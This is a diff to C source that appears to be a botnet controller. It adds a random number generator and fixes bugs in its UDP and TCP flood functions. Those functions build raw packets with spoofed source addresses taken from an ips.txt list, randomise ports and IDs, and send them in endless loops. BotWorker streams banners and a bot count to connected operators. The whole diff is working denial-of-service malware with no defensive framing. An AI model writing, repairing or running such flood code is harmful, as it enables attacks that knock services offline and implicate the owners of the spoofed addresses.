@@ -62,6 +62,31 @@ uint64_t numpids = 0;
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
 
+uint32_t rand_cmwc(void)
+{
+	uint64_t t, a = 18782LL;
+	static uint32_t i = 4095;
+	uint32_t x, r = 0xfffffffe;
+	i = (i + 1) & 4095;
+	t = a * Q[i] + c;
+	c = (t >> 32);
+	x = t + c;
+	if (x < c) {
+	x++;
+	c++;
+	}
+	return (Q[i] = r - x);
+}
+void init_rand(uint32_t x)
+{
+        int i;
+
+        Q[0] = x;
+        Q[1] = x + PHI;
+        Q[2] = x + PHI + PHI;
+
+        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+}
 unsigned short csum (unsigned short *buf, int count)
 {
         register uint64_t sum = 0;
@@ -72,7 +97,7 @@ unsigned short csum (unsigned short *buf, int count)
 }
 int botcountlines()
 {                                    
-  FILE *fp = fopen("ips.txt,"r");
+  FILE *fp = fopen("ips.txt","r");
   int ch=0;
   int lines=0;
 
@@ -160,6 +185,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
         if(getHost(target, &dest_addr.sin_addr)) return;
         memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
 
+	register unsigned int i = 0;
         register unsigned int pollRegister;
         pollRegister = pollinterval;
         head = NULL;
@@ -192,7 +218,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
 		}
 	}
 	struct list *current = head->next;
-
+                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                 if(!sockfd)
                 {
                         printf("Failed opening raw socket.");
@@ -221,7 +247,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                 struct iphdr *iph = (struct iphdr *)packet;
                 struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
 
-                makeIPPacket(iph, dest_addr.sin_addr.s_addr, list_node->data.sin_addr.s_addr, IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
+                makeIPPacket(iph, dest_addr.sin_addr.s_addr, data.sin_addr.s_addr, IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
 
                 udph->len = htons(sizeof(struct udphdr) + packetsize);
                 udph->dest = (port == 0 ? rand_cmwc() : htons(port));
@@ -232,7 +258,6 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
                 iph->check = csum ((unsigned short *) packet, iph->tot_len);
 
                 int end = time(NULL) + timeEnd;
-                register unsigned int i = 0;
                 while(1)
                 {
                         udph->source = htons(rand() % 65535 - 1026);
@@ -240,7 +265,7 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize, int p
 		        iph->saddr = list_node->data.sin_addr.s_addr;
                         iph->id = rand_cmwc();
                         iph->check = csum ((unsigned short *) packet, iph->tot_len);
-                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
+                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
 
                         if(i == pollRegister)
                         {
@@ -263,13 +288,14 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         if(getHost(target, &dest_addr.sin_addr)) return;
         memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
 
+	register unsigned int i = 0;
         register unsigned int pollRegister;
         pollRegister = pollinterval;
         head = NULL;
         int max_len = 128;
 	char *buffer = (char *) malloc(max_len);
 	buffer = memset(buffer, 0x00, max_len);
-
+        FILE *ips = fopen("ips.txt","r");
 	while (fgets(buffer, max_len, ips) != NULL) {
 		if ((buffer[strlen(buffer) - 1] == '\n') ||
 				(buffer[strlen(buffer) - 1] == '\r')) {
@@ -310,14 +336,14 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         }
         memset(&ifr, 0, sizeof(ifr));
         snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "lo");
-        if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
+        if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {
                printf("Error binding to interface.");
         }
         unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
         struct iphdr *iph = (struct iphdr *)packet;
         struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
 
-        makeIPPacket(iph, dest_addr.sin_addr.s_addr, list_node->data.sin_addr.s_addr, IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
+        makeIPPacket(iph, dest_addr.sin_addr.s_addr, data.sin_addr.s_addr, IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
 
         tcph->seq = rand_cmwc();
         tcph->ack_seq = 0;
@@ -364,7 +390,7 @@ void sendTCP(unsigned char *target, int port, int timeEnd, unsigned char *flags,
         iph->check = csum ((unsigned short *) packet, iph->tot_len);
 
         int end = time(NULL) + timeEnd;
-        register unsigned int i = 0;
+        
         while(1)
         {
                 sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
@@ -858,7 +884,6 @@ void *BotWorker(int argc, char *argv[ ], void *sock) {
 				if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
-				if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
 				if(send(datafd, welcome_line, 		strlen(welcome_line), 		MSG_NOSIGNAL) == -1) goto end;
 				while(1) {
 				if(send(datafd, banner_bot_count,	strlen(banner_bot_count),	MSG_NOSIGNAL) == -1) goto end;
